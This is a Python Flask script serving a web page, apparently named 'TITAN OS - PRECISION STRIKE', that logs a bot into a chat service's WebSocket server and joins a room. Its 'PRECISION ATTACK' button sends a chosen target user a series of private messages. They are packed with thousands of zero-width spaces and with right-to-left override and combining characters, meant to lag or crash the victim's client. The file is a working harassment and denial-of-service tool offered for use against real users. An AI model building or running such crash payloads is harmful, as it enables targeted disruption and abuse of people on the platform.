import os
from flask import Flask, render_template_string

app = Flask(__name__)

# Wahi Mast v4.2 Interface
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN OS - PRECISION STRIKE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --neon: #00f3ff; --term: #00ff41; --danger: #ff003c; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        .nav { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 10px; border-radius: 4px; font-size: 12px; }
        button { padding: 10px; font-weight: bold; cursor: pointer; border: 1px solid var(--neon); background: transparent; color: var(--neon); text-transform: uppercase; font-size: 11px; }
        button:hover { background: var(--neon); color: #000; }
        .atk-btn { background: var(--danger) !important; color: #fff !important; border: none !important; font-size: 13px; }
        .terminal-zone { flex: 1; display: flex; flex-direction: column; background: #000; overflow: hidden; }
        .term-head { background: #1a1a1a; padding: 8px 15px; font-size: 11px; color: #666; display: flex; justify-content: space-between; }
        .terminal-body { flex: 1; overflow-y: scroll; padding: 15px; font-size: 12px; scroll-behavior: smooth; }
        .line { margin-bottom: 8px; border-left: 3px solid #222; padding-left: 12px; word-break: break-all; }
        .in { color: var(--term); } .out { color: var(--neon); } .err { color: var(--danger); }
    </style>
</head>
<body>
    <div class="nav">
        <input type="text" id="u" placeholder="Bot User">
        <input type="password" id="p" placeholder="Bot Pass">
        <input type="text" id="r" placeholder="Room Name">
        <input type="text" id="t" placeholder="Target User">
        <button onclick="connectBot()">INITIALIZE</button>
        <button class="atk-btn" onclick="precisionAttack()">PRECISION ATTACK</button>
        <button onclick="document.getElementById('terminal').innerHTML=''" style="border-color:#444;color:#444">CLEAR</button>
    </div>
    <div class="terminal-zone">
        <div class="term-head"><span>STABILITY_MONITOR [v5.2]</span><span id="stat">OFFLINE</span></div>
        <div id="terminal" class="terminal-body"></div>
    </div>
    <script>
        let ws; let pinger; const term = document.getElementById('terminal');
        function log(msg, type='sys') {
            const div = document.createElement('div');
            div.className = `line ${type}`;
            div.innerHTML = `<b>[${new Date().toLocaleTimeString()}]</b> ${msg}`;
            term.appendChild(div); term.scrollTop = term.scrollHeight;
        }
        function connectBot() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const r = document.getElementById('r').value;
            ws = new WebSocket("wss://chatp.net:5333/server");
            ws.onopen = () => {
                document.getElementById('stat').innerText = "ONLINE";
                log("Connected. Logging in...", "sys");
                ws.send(JSON.stringify({handler:"login", id: Math.random(), username: u, password: p, platform: "web"}));
                pinger = setInterval(() => { if(ws.readyState===1) ws.send(JSON.stringify({handler:"ping"})); }, 25000);
            };
            ws.onmessage = (e) => {
                const data = JSON.parse(e.data);
                if(data.handler === "login_event" && data.type === "success") {
                    log("Login Success", "in");
                    ws.send(JSON.stringify({handler: "room_join", id: Math.random(), name: r}));
                }
                if(data.handler === "room_event" && data.type === "you_joined") log("Joined Room: " + r, "in");
            };
            ws.onclose = () => { clearInterval(pinger); document.getElementById('stat').innerText = "OFFLINE"; log("Disconnected.", "err"); };
        }
        function precisionAttack() {
            const target = document.getElementById('t').value;
            if(!ws || ws.readyState !== 1) return log("Bot Offline!", "err");
            const buf = " " + "\\u200B".repeat(5000);
            const crash = "\\u202E" + "҉".repeat(100) + "L_A_G" + "\\u202D";
            const pkts = [buf, crash, buf, crash];
            pkts.forEach((p, i) => {
                setTimeout(() => {
                    if(ws.readyState === 1) {
                        ws.send(JSON.stringify({handler: "chat_message", to: target, type: "text", body: p, is_private: true}));
                        log(`STAGE ${i+1} SENT`, "out");
                    }
                }, i * 850);
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
